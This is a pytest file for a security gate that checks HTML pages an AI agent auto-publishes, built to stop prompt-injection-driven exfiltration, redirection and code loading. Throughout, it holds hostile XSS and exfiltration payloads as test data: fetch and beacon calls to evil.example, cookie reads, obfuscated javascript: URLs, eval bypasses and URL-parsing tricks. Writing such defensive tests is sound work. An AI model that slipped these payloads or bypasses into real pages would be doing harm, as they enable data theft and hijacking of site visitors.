"""SECURITY gate in agent/skills/check.py.

The agent reads untrusted text (CKAN cells, fetched pages, search
results) and a passing body auto-publishes to govil.ai, so check.py must
reject the constructs a prompt injection would use to exfiltrate,
redirect, or load foreign code. Every rule must stay silent on the
already-published corpus — the corpus regression test enforces that
whenever the local corpus is present (it is gitignored/not in CI).
"""
import glob
import importlib.util
from pathlib import Path

import pytest

_CHECK_PATH = (
    Path(__file__).resolve().parents[3] / "agent" / "skills" / "check.py"
)
_spec = importlib.util.spec_from_file_location("agent_check_security", _CHECK_PATH)
check = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(check)


def _rejects(body: str, capsys, rule: str) -> None:
    with pytest.raises(SystemExit) as ei:
        check.check_security(body)
    assert ei.value.code == 11
    out = capsys.readouterr().out
    assert f"SECURITY/{rule}" in out, out


def _passes(body: str) -> None:
    check.check_security(body)


def _script(js: str) -> str:
    return f'<section class="card p-5 mb-6"><div id="c1"></div><script>\n{js}\n</script></section>'


# ── HTML-level bans (case-insensitive) ──
@pytest.mark.parametrize(
    "body,rule",
    [
        ('<iframe src="https://evil.example"></iframe>', "EMBEDDED-DOCUMENT"),
        ("<IFRAME SRC=x></IFRAME>", "EMBEDDED-DOCUMENT"),
        ('<frame src="x">', "EMBEDDED-DOCUMENT"),
        ('<object data="x.swf"></object>', "EMBEDDED-DOCUMENT"),
        ('<embed src="x">', "EMBEDDED-DOCUMENT"),
        ('<base href="https://evil.example/">', "EMBEDDED-DOCUMENT"),
        ('<meta http-equiv="refresh" content="0;url=https://evil.example">', "EMBEDDED-DOCUMENT"),
        ('<div srcdoc="<b>x</b>"></div>', "EMBEDDED-DOCUMENT"),
        ('<form action="https://evil.example"><input name=q></form>', "FORM"),
        ('<Form method=post></Form>', "FORM"),
        ('<a href="javascript:alert(1)">x</a>', "SCRIPT-URL"),
        ('<a href="JavaScript:alert(1)">x</a>', "SCRIPT-URL"),
        ('<a href="vbscript:msgbox">x</a>', "SCRIPT-URL"),
        ('<a href="java&#115;cript:alert(1)">x</a>', "SCRIPT-URL"),
        ('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>', "SCRIPT-URL"),
        ('<img src="/icons/x.svg" onload="steal()">', "INLINE-HANDLER"),
        ('<div ONMOUSEOVER="x()">a</div>', "INLINE-HANDLER"),
        ("<img src=/icons/x.svg onerror=\"fetch('//e')\">", "INLINE-HANDLER"),
        ('<button onclick="window.open(\'https://evil.example\',\'_blank\')">x</button>', "INLINE-HANDLER"),
        ('<script type="module">import x from "y";</script>', "SCRIPT-MODULE"),
        ("<style>@import url(https://evil.example/x.css);</style>", "EXTERNAL-RESOURCE"),
        ("<style>.a{background:url('//evil.example/p.png')}</style>", "EXTERNAL-RESOURCE"),
        ('<a href="/x" ping="https://evil.example">x</a>', "EXTERNAL-RESOURCE"),
        ('<img srcset="https://evil.example/a.png 1x">', "EXTERNAL-RESOURCE"),
        ('<svg><image href="https://evil.example/a.png"/></svg>', "EXTERNAL-RESOURCE"),
        ('<img src="https://evil.example/pixel.gif?c=1">', "EXTERNAL-SRC"),
        ('<img src="//evil.example/pixel.gif">', "EXTERNAL-SRC"),
        ('<img src="http://www.gov.il/x.png">', "EXTERNAL-SRC"),
        ('<img src="https://gov.il.evil.example/x.png">', "EXTERNAL-SRC"),
        ('<video poster="https://evil.example/p.jpg"></video>', "EXTERNAL-SRC"),
    ],
)
def test_html_rules_reject(body, rule, capsys):
    _rejects(body, capsys, rule)


# ── JS-level bans ──
@pytest.mark.parametrize(
    "js,rule",
    [
        ("fetch('https://evil.example/?d=' + 1);", "NETWORK-API"),
        ("var x = new XMLHttpRequest();", "NETWORK-API"),
        ("navigator.sendBeacon('https://evil.example', 'x');", "NETWORK-API"),
        ("var w = new WebSocket('wss://evil.example');", "NETWORK-API"),
        ("new Image().src = 'https://evil.example/?c=1';", "NETWORK-API"),
        ("el.src = 'https://evil.example/x.js';", "NETWORK-API"),
        ("el.setAttribute('src', 'https://evil.example/x.js');", "NETWORK-API"),
        ("var c = document.cookie;", "STORAGE-API"),
        ("localStorage.setItem('a', 1);", "STORAGE-API"),
        ("sessionStorage.getItem('a');", "STORAGE-API"),
        ("eval('1+1');", "DYNAMIC-CODE"),
        ("var f = new Function('return 1');", "DYNAMIC-CODE"),
        ("import('https://evil.example/m.js');", "DYNAMIC-CODE"),
        ("setTimeout('alert(1)', 10);", "DYNAMIC-CODE"),
        ("var s = document.createElement('script');", "DYNAMIC-CODE"),
        ('var s = document.createElement("script");', "DYNAMIC-CODE"),
        ("window['ev' + 'al']('1');", "DYNAMIC-CODE"),
        ("document.write('<p>x</p>');", "DYNAMIC-CODE"),
        ("el.insertAdjacentHTML('beforeend', '<p>x</p>');", "DYNAMIC-CODE"),
        ("window.location = 'https://evil.example';", "NAVIGATION"),
        ("location.href = 'https://evil.example';", "NAVIGATION"),
        ("location = 'https://evil.example';", "NAVIGATION"),
        ("top.location.replace('https://evil.example');", "NAVIGATION"),
        ("location.assign('https://evil.example');", "NAVIGATION"),
        ("window.open('https://evil.example');", "NAVIGATION"),
    ],
)
def test_js_rules_reject(js, rule, capsys):
    _rejects(_script(js), capsys, rule)


@pytest.mark.parametrize(
    "js",
    [
        "eval/**/('1');",  # comment between name and call
        "\\u0065val('1');",  # unicode-escaped identifier (at block start)
        "var a = 1; \\u0065val('1');",  # … and mid-block
        "var x = window.fe\\u0074ch;",
    ],
)
def test_token_level_bypasses_rejected(js, capsys):
    if check._esprima is None:
        pytest.skip("esprima not installed")
    with pytest.raises(SystemExit) as ei:
        check.check_security(_script(js))
    assert ei.value.code == 11
    assert "SECURITY/" in capsys.readouterr().out


# ── legit shapes from the published corpus must pass ──
@pytest.mark.parametrize(
    "body",
    [
        # icon headers + gov.il images
        ('<div class="flex items-center gap-2 mb-3 text-brand">'
        '<img src="/icons/chart-bar.svg" alt="" class="w-5 h-5"/><h2>x</h2></div>'),
        ('<img src="https://govextra.gov.il/media/x.png" alt="" '
        "onerror=\"this.style.visibility='hidden'\"/>"),
        "<img src=\"/icons/x.svg\" onerror=\"this.style.display='none'\">",
        # the one benign onclick in the corpus
        ('<button type="button" class="btn-ghost text-xs" '
        "onclick=\"window.open('https://data.gov.il/dataset/51227f7b-26fe-4a79-ba70-5468add8b1a4','_blank')\">"
        "מאגר הנתונים</button>"),
        # external <a href> links are fine
        '<a href="https://www.gov.il/he/departments/x" target="_blank" rel="noopener">x</a>',
        # Leaflet tiles are a JS string, not a src= attribute
        _script(
            "var m = L.map('map'); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);"
        ),
        # table rows built with innerHTML / createElement + textContent
        _script(
            "var tb = document.getElementById('t'); rows.forEach(function(r){"
            " var tr = document.createElement('tr');"
            " tr.innerHTML = '<th scope=\"row\">' + r[0] + '</th><td>' + r[1] + '</td>';"
            " tb.appendChild(tr); });"
        ),
        _script("var a = document.createElement('a'); a.href = r[2]; a.textContent = 'x';"),
        # JS-concatenated src in a string is not an absolute URL
        _script("var h = '<img src=\"' + icon + '\">';"),
        # data field named "location" and a resize handler on window[name]
        _script(
            "var cfg = { field: 'location', label: 'x' };"
            " window.addEventListener('resize', function(){ window[name].resize(); });"
        ),
        # <input> controls without a <form>
        '<input type="search" id="q" class="border rounded-gov">',
        # JSON data island with arbitrary dataset text
        '<script type="application/json" id="d">{"t": "fetch the eval"}</script>',
    ],
)
def test_corpus_shapes_pass(body):
    _passes(body)


def test_hygiene_is_case_insensitive(capsys):
    for body in ('<SCRIPT SRC="https://x/y.js"></SCRIPT>', '<LINK rel="stylesheet" href="x">',
                 "<Body>x</Body>"):
        with pytest.raises(SystemExit):
            check.check_html_hygiene(body)


_CORPUS = sorted(
    glob.glob(
        str(Path(__file__).resolve().parents[3] / "frontend" / "public" / "datasets" / "*" / "content.html")
    )
)


@pytest.mark.skipif(not _CORPUS, reason="published corpus not present (local-only)")
def test_published_corpus_has_zero_security_hits(capsys):
    hits = []
    for f in _CORPUS:
        body = Path(f).read_text(encoding="utf-8")
        try:
            check.check_security(body)
        except SystemExit:
            hits.append((f, capsys.readouterr().out[:200]))
        m = check.HYGIENE_RE.search(body)  # now case-insensitive
        if m:
            hits.append((f, body[max(0, m.start() - 20):m.end() + 20]))
    assert not hits, hits[:5]


def test_main_runs_security_gate(tmp_path, capsys):
    html = tmp_path / "content.html"
    data = tmp_path / "agent_data.json"
    html.write_text(_script("fetch('https://evil.example/?d=' + document.title);"), encoding="utf-8")
    data.write_text(
        '{"summary_he": "x", "dataset_kind": "misc", "suggested_tags": ["a"]}',
        encoding="utf-8",
    )
    with pytest.raises(SystemExit) as ei:
        check.main(["check.py", str(html), str(data)])
    assert ei.value.code == 11
    assert "SECURITY/NETWORK-API" in capsys.readouterr().out


# ── Parser-differential bypasses (review follow-up) ──
@pytest.mark.parametrize("src", [
    "https://gov.il:@evil.com/x.png",          # userinfo `gov.il:` on host evil.com
    "https://www.gov.il@evil.com/x.png",
    "https://evil.com/?https://www.gov.il/",
    "https://www.gov.il\\@evil.com/x.png",
    "https://www.gov.il:8443/x.png",
    "https://gov.il.evil.com/x.png",
    "http://www.gov.il/x.png",
])
def test_src_allowlist_parses_urls(src, capsys):
    _rejects(f'<img src="{src}" alt="">', capsys, "EXTERNAL-SRC")


@pytest.mark.parametrize("src", [
    "https://www.gov.il/logo.png",
    "https://gov.il/a.png",
    "https://tile.openstreetmap.org/1/2/3.png",
    "https://WWW.GOV.IL./x.png",
])
def test_src_allowlist_accepts_allowed_hosts(src):
    _passes(f'<img src="{src}" alt="">')


@pytest.mark.parametrize("href", [
    "java\tscript:alert(1)",
    "java&#9;script:alert(1)",
    "java&#10;script:alert(1)",
    "\x01javascript:alert(1)",
])
def test_script_url_with_control_chars(href, capsys):
    _rejects(f'<a href="{href}">x</a>', capsys, "SCRIPT-URL")


@pytest.mark.parametrize("js", [
    "globalThis.alert(1);",
    "[].map.constructor('alert(1)')();",
    "self['ev' + 'al']('1');",
    "top[k](1);",
    "document['coo' + 'kie'];",
])
def test_dynamic_global_access_rejected(js, capsys):
    _rejects(_script(js), capsys, "DYNAMIC-CODE")


# ── Data strings are data: the JS/URL rules scan code and markup only ──
_DATA_TEMPLATE = (
    '<section class="card p-5 mb-6"><p>{{ model.v }}</p>'
    '<a href="/x" title="{{ model.v }}">x</a><script>(function(){'
    # Data reaches JS through tojson (a JSON string literal), never through
    # autoescaped {{ }} in a template literal: autoescape leaves ` and ${ alone.
    "var rows = {{ model.rows|tojson }}; var t = {{ model.v|tojson }};"
    ' var el = document.getElementById("x");'
    " if (el) { el.textContent = rows.length + t; }"
    '})();</script><script type="application/json" id="d">{{ model.rows|tojson }}'
    "</script></section>"
)


@pytest.mark.parametrize("value", [
    "https://www.gov.il/he/service?location=12",
    "Goods import (tons)",
    "Job Function (role)",
    "קורס JavaScript: מתקדם",
    "Java Script: course",
    "GPS navigator. דגם",
    "eval(x) fetch(y) localStorage window.open(z) document.cookie",
    "metadata: text/html",
])
def test_data_strings_do_not_trip_code_rules(value):
    from services.page_builder.recipe import render_template

    v = value
    if "JavaScript:" in v or "Java Script:" in v or "text/html" in v:
        # A javascript: URL in an attribute value is still caught (below),
        # so keep URL-shaped values out of the title attribute here.
        body = render_template(
            _DATA_TEMPLATE.replace(' title="{{ model.v }}"', ""),
            {"v": v, "rows": [{"name": v}]},
        )
    else:
        body = render_template(_DATA_TEMPLATE, {"v": v, "rows": [{"name": v}]})
    _passes(body)


@pytest.mark.parametrize("js,rule", [
    ("var u = location = 'x';", "NAVIGATION"),
    ("import('x');", "DYNAMIC-CODE"),
    ("var f = Function ('return 1');", "DYNAMIC-CODE"),
    ("var n = navigator.userAgent;", "NETWORK-API"),
    ("var s = `a ${eval('1')} b`;", "DYNAMIC-CODE"),
    ("var s = `a ${`b ${fetch('//e')} c`} d`;", "NETWORK-API"),
    ("var s = 'a' + window.open('x') + 'b';", "NAVIGATION"),
])
def test_same_constructs_in_code_still_fail(js, rule, capsys):
    _rejects(_script(js), capsys, rule)


def test_unparseable_block_is_scanned_whole(capsys):
    # No tokens: the string is not known to be data, so it is scanned.
    _rejects(_script("var a = 'x\n var b = \"fetch(1)\";"), capsys, "NETWORK-API")


def test_unclosed_script_is_scanned(capsys):
    _rejects('<p>x</p><script>var a = 1; fetch("//e");', capsys, "NETWORK-API")


@pytest.mark.parametrize("body", [
    '<a href="javascript:alert(1)">x</a>',
    '<a title="x" href="java&#115;cript:alert(1)">x</a>',
    "<a title=don't href=\"javascript:alert(1)\">x</a>",
    '<a title=">" href="javascript:alert(1)">x</a>',
    '<style>.a{background:url(javascript:x)}</style>',
])
def test_script_url_in_markup_still_fails(body, capsys):
    _rejects(body, capsys, "SCRIPT-URL")


# ── type= must be the real attribute ──
def test_data_type_attribute_does_not_make_a_json_island(capsys):
    if check._esprima is None:
        pytest.skip("esprima not installed")
    _rejects('<script data-type="json">ev\\u0061l("1")</script>', capsys, "ESCAPED-IDENTIFIER")
    _rejects('<script data-type="json">var x = "a"; fetch("//e");</script>', capsys, "NETWORK-API")
    _rejects('<script data-x="a type=json">fetch("//e");</script>', capsys, "NETWORK-API")


@pytest.mark.parametrize("attrs", [
    ' type="application/json"', " type='application/ld+json'", " type=application/json",
    ' id="d" type="application/json"',
])
def test_real_json_islands_still_skipped(attrs):
    _passes(f'<script{attrs}>{{"t": "fetch(1) eval(2) location=3"}}</script>')


# ── every loading attribute of a tag is checked ──
@pytest.mark.parametrize("body", [
    '<img data="/a" src="https://evil.com/p.png">',
    '<video poster="/a.png" src="https://evil.com/v.mp4"></video>',
    '<img src="/icons/a.svg" alt="" data="https://evil.com/x">',
])
def test_every_loading_attribute_checked(body, capsys):
    _rejects(body, capsys, "EXTERNAL-SRC")


def test_many_matching_data_strings_are_checked_quickly():
    # 30k data strings that each match a JS rule: the literal lookup must
    # not be linear per match. Absolute bound with a wide margin (this
    # takes well under a second on a dev machine; the quadratic lookup took
    # about a minute at this size).
    import json
    import time

    if check._esprima is None:
        pytest.skip("esprima not installed")
    rows = [{"name": f"GPS navigator. model {i}", "v": i} for i in range(30000)]
    body = _script(f"var rows = {json.dumps(rows)}; var n = rows.length;")
    t0 = time.monotonic()
    _passes(body)
    assert time.monotonic() - t0 < 20


@pytest.mark.parametrize("js,rule", [
    ('var a=1;<!--<script></script>\nfetch("//e");\n', "NETWORK-API"),
    ('var a=1;<!--<script></script>\nlocation.href = "//e";\n', "NAVIGATION"),
])
def test_comment_opener_in_script_scans_rest_of_body(js, rule, capsys):
    # After `<!--<script` the browser does not end the block at the next
    # `</script>`, so the code after it still runs.
    _rejects(f"<section><script>{js}</script></section>", capsys, rule)
